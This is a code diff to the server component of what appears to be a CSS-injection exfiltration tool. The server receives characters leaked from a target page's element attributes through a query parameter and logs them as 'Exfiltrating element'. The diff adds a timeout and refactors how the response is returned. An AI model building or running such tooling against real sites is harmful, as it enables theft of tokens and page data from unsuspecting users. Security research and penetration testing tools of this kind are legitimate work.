@@ -27,6 +27,7 @@ class Server:
             port=self.port,
             element=self.element,
             attribut=self.attribut,
+            timeout=getattr(args, "timeout", 3.0),
         )
 
     async def start(self):
@@ -107,9 +108,11 @@ class Server:
 
     async def handle_valid(self, request):
         client = self._get_client(request)
+        data = request.query.get("t")
 
         client.event.set()
-        client.data = request.query.get("t")
+
+        self.strategy.handle_valid(client, data)
 
         if self.output_file:
             self.output_file.update()
@@ -117,10 +120,10 @@ class Server:
         if self.show_details:
             Console.log(
                 LogLevel.EXFILTRATION,
-                f"[{client.id}] - Exfiltrating element: {client.data}",
+                f"[{client.id}] - Exfiltrating element: {data}",
             )
 
-        return web.Response(text=self.strategy.handle_valid(client, request.query.get("t")), content_type="text/css")
+        return web.Response(text="ok", content_type="text/css")
 
     async def dynamic_router_middleware(self, app, handler):
         async def middleware_handler(request):
